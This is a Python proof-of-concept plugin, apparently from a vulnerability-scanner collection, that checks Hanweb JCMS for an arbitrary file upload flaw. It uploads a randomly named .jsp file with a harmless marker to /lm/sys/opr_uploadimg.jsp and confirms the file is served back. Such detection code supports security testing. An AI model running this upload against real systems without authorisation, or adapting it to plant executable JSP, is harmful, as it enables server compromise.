# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
import random


class Vuln(ABVuln):
    vuln_id = 'Hanweb_0015'  # 平台漏洞编号，留空
    name = '大汉JCMS /lm/sys/opr_uploadimg.jsp 文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        大汉科技（Hanweb) JCMS /lm/sys/opr_uploadimg.jsp 任意文件上传漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉JCMS'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a6d1ede5-6aa9-45b6-9e4b-cccf6dfb8d1c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            # 生成随机名称文件
            test_jsp = 'test' + str(random.randint(1, 10000)) + '.jsp'
            payload = '/lm/sys/opr_uploadimg.jsp?action=upload&img={test}'.format(
                test=test_jsp)
            data = """
                --4e400c16cce04a9d803521e49ff67443
                Content-Disposition: form-data; name="NewFile"; filename="57h9.gif"
                Content-Type: image/gif

                testvul

                --4e400c16cce04a9d803521e49ff67443--
            """
            header = 'Content-Type: multipart/form-data; boundary=4e400c16cce04a9d803521e49ff67443'
            target = arg + payload
            code, head, res, errcode, _ = hh.http(
                target, header=header, post=data)
            if code == 200 and '上传成功' in res:
                code1, head1, res1, errcode1, _1 = hh.http(
                    arg + '/images/' + test_jsp)
                if code1 == 200 and 'testvul' in res1:
                    # security_hole(target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
